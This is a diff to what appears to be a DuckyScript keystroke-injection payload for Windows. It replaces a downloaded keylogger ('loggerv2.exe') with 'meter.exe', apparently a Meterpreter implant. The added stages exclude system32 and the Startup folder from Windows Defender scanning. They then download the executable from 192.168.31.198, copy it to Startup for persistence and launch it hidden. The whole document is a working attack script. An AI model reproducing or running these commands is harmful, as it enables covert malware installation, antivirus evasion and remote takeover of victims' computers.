@@ -38,19 +38,27 @@ ENTER
 DELAY 2000
 
 REM ######## STAGE2 ########
-
-STRING curl -o loggerv2.exe 192.168.31.198/loggerv2.txt
+STRING powershell Add-MpPreference -ExclusionPath "C:\Windows\system32"
 ENTER
 DELAY 3000
 
+REM ######## STAGE2 ########
+STRING powershell Add-MpPreference -ExclusionPath "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+ENTER
+DELAY 3000
+
+STRING curl -o meter.exe 192.168.31.198/meter.txt
+ENTER
+DELAY 2000
+
 REM ######## STAGE3 ########
 
-STRING copy loggerv2.exe "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
+STRING copy meter.exe "C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 ENTER
 DELAY 2000
 REM ######## STAGE4 ########
 
-STRING start /B loggerv2.exe
+STRING start /B meter.exe
 ENTER
 DELAY 1500
 
